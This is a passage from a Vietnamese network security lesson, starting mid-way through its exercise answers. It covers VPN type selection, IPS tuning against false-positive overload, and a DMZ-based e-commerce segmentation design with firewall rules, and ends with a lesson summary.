Với kiến trúc này: ransomware trên máy nhân viên bị cô lập trong vùng workstations, không lan được sang server.

**Bài 4 — Chọn loại VPN**:

(a) 200 nhân viên từ xa → **Remote Access VPN**.
- Mỗi nhân viên chạy VPN client (WireGuard/OpenVPN) trên laptop/điện thoại.
- Sau khi xác thực, được cấp IP thuộc mạng nội bộ (ví dụ 10.0.50.x).
- Truy cập được hệ thống nội bộ như khi ngồi tại văn phòng.
- Nên dùng MFA (xác thực đa yếu tố) kết hợp.

(b) Kết nối chi nhánh Đà Nẵng — Hà Nội → **Site-to-Site VPN**.
- Cài VPN gateway tại mỗi đầu (router/firewall có hỗ trợ VPN).
- Cấu hình tunnel: 192.168.2.0/24 (Đà Nẵng) ↔ 10.1.0.0/16 (HN).
- Always-on: toàn bộ traffic giữa 2 mạng đi qua tunnel tự động, nhân viên không cần làm gì.
- Dùng IPsec IKEv2 hoặc WireGuard tùy phần cứng gateway.

**Bài 5 — Alert fatigue**:

Vấn đề: 95% FP là rate cực kỳ cao. Tắt rules là phản ứng sai — sẽ bỏ sót cả FN (tấn công thật).

Cách tiếp cận đúng (tune IPS theo 3 bước):
1. **Phân tích FP**: lấy 1.000 alert ngẫu nhiên, phân loại xem loại nào chiếm đa số FP. Thường là 3-5 rules chiếm 80% FP (quy tắc Pareto).
2. **Điều chỉnh từng rule**: không tắt hẳn mà thêm exception. Ví dụ: rule phát hiện port scan đang cảnh báo với monitoring tool nội bộ → thêm `except src=10.0.100.5` (IP monitoring server).
3. **Đổi sang detect mode**: rule tốt nhưng cần kiểm chứng → chạy ở IDS mode (chỉ log, không block) trong 2 tuần, xem còn FP không rồi mới bật block.

Mục tiêu thực tế: giảm xuống còn 50-200 alert/ngày có chất lượng cao, không phải 0 alert.

**Bài 6 — Thiết kế phân vùng e-commerce**:

```
Internet
    |
[External Firewall]
    |
   DMZ (10.1.1.0/24)
   ├── Web Server     10.1.1.10   — nhận HTTP/HTTPS từ internet
   └── Mail Server    10.1.1.20   — nhận/gửi email
    |
[Internal Firewall]
    |
   App Zone (10.1.2.0/24)
   └── App Server     10.1.2.10   — xử lý đơn hàng, logic nghiệp vụ
    |
   Data Zone (10.1.3.0/24)        ← tách riêng, hạn chế truy cập tối đa
   └── DB Server      10.1.3.10   — khách hàng + thẻ tín dụng
    |
   Office Zone (10.1.4.0/24)
   └── Workstations 10.1.4.x      — nhân viên
```

Rule firewall chính:
```
External FW:
  ALLOW  any → 10.1.1.10: 80, 443  # Web
  ALLOW  any → 10.1.1.20: 25, 587  # Mail
  DENY   any → 10.1.2.0/24         # Không vào thẳng App
  DENY   any → 10.1.3.0/24         # Không vào thẳng DB
  DENY   any → 10.1.4.0/24         # Không vào Office

Internal FW:
  ALLOW  10.1.1.10 → 10.1.2.10: 8080    # Web → App
  ALLOW  10.1.2.10 → 10.1.3.10: 5432    # App → DB (PostgreSQL)
  ALLOW  10.1.1.20 → 10.1.2.10: 8025    # Mail → App (thông báo)
  ALLOW  10.1.4.0/24 → admin jump server  # Nhân viên qua jump server
  DENY   10.1.4.0/24 → 10.1.3.0/24      # Nhân viên không vào DB trực tiếp
  DENY   default
```

Lưu ý về PCI DSS (tiêu chuẩn bảo mật thẻ tín dụng): Data Zone chứa dữ liệu thẻ phải tuân thủ PCI DSS, cần tách biệt, mã hóa data at rest, và audit log đầy đủ.

---

## Liên kết và bài tiếp theo

- **Tiền đề**: [Lesson 06 — TLS](../../02-Application-Services/lesson-06-tls/) — mã hóa end-to-end liên quan trực tiếp khi hiểu VPN và bảo vệ dữ liệu truyền.
- **Bài tiếp theo**: [Lesson 02 — Tấn công và phòng thủ thực chiến](../lesson-02-attacks-defense/) — đi sâu vào các loại tấn công cụ thể (DDoS, MITM, SQL injection...) và kỹ thuật phòng thủ tương ứng.

---

## Xem thêm

- [visualization.html](./visualization.html) — mô phỏng tương tác: firewall rule engine, sơ đồ DMZ, đường hầm VPN.

---

## 📝 Tổng kết Lesson 01

1. **Tam giác CIA** là khung tham chiếu mọi quyết định bảo mật: Confidentiality (bí mật), Integrity (toàn vẹn), Availability (khả dụng). Bề mặt tấn công có 3 chiều: mạng, phần mềm, con người.

2. **Firewall packet-filter** duyệt rule theo thứ tự trên-xuống với implicit deny; stateful theo dõi bảng kết nối, tự động cho phép traffic trả về và phát hiện gói giả mạo tốt hơn. NAT không phải firewall — không có policy bảo mật.

3. **VPN** mã hóa đường hầm qua internet: site-to-site cho kết nối chi nhánh (always-on), remote access cho người dùng từ xa. IPsec là chuẩn phần cứng phổ biến; WireGuard là lựa chọn hiện đại hiệu năng cao.

4. **IDS phát hiện, IPS ngăn chặn**. Signature-based: ít FP, không bắt zero-day. Anomaly-based: bắt được mới, nhiều FP. Alert fatigue (FP quá nhiều) là nguy hiểm thực sự.

5. **Phân vùng mạng** (DMZ, internal, office) kết hợp **defense in depth** và **least privilege** là kiến trúc bảo mật đúng đắn. Flat network là rủi ro lớn: một breach lan toàn mạng.
